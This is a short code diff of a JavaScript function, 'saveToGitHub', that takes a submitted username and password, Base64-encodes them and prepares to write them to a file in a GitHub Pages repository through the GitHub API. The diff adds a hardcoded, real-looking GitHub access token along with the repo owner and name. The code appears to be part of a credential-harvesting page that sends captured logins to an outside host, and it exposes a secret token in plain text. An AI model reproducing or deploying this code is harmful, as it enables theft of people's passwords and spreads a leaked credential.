@@ -7,9 +7,9 @@ async function saveToGitHub(event) {
     let newEntry = `Username: ${username}\nPassword: ${password}\n------------------------------------------------------------------\n`; // Define newEntry
     let encodedNewEntry = btoa(unescape(encodeURIComponent(newEntry))); // Fix Base64 encoding
 
-    let githubToken = "token"; // Secure input instead of hardcoding
-    let repoOwner = "user naem";
-    let repoName = "project repo name";
+    let githubToken = "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"; // Secure input instead of hardcoding
+    let repoOwner = "Psivasai970";
+    let repoName = "Psivasai970.github.io";
     let filePath = "username.txt";
 
     let url = `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`;
